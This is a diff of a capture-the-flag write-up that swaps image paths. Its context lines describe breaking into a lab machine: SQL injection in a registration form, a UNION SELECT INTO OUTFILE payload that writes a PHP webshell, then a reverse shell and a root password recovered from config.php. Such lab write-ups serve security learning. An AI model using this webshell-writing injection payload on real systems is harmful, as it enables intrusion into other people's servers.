@@ -4,13 +4,13 @@
 
 Nmap scan:
 
-<figure><img src="../../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (87) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### SQL Injection for RCE
 
 The website contains a simple register function that takes user input.
 
-<figure><img src="../../../.gitbook/assets/image (98).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (98) (4).png" alt=""><figcaption></figcaption></figure>
 
 When proxying the traffic, the POST request is submitted like so:
 
@@ -20,7 +20,7 @@ username='&country=Afganistan
 
 When viewing our request, this is what we would see:
 
-<figure><img src="../../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (85) (2).png" alt=""><figcaption></figcaption></figure>
 
 A quick directory scan reveals there is an `account.php` endpoint on the machine.&#x20;
 
@@ -55,7 +55,7 @@ by Ben "epi" Risher 🤓                 ver: 2.3.1
 
 The `config.php` endpoint presented an empty screen, which I think we have to look into after gaining a shell. Anyways, the `account.php` file displayed an SQL error when trying to view the player I registered.
 
-<figure><img src="../../../.gitbook/assets/image (106).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (106) (3).png" alt=""><figcaption></figcaption></figure>
 
 Instead of enumerating the database, I directly wrote a webshell into the page.
 
@@ -65,7 +65,7 @@ username=a&Afganistan' UNION SELECT "<?php system($_REQUEST['cmd']); ?>" INTO OU
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (103).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (103) (2).png" alt=""><figcaption></figcaption></figure>
 
 Then, we can get a reverse shell and enumerate the `config.php` file we saw earlier.
 
@@ -73,6 +73,6 @@ Then, we can get a reverse shell and enumerate the `config.php` file we saw earl
 
 Within the config file, there was a password, which happened to be the root password.
 
-<figure><img src="../../../.gitbook/assets/image (105).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (105) (2).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (109) (3).png" alt=""><figcaption></figcaption></figure>
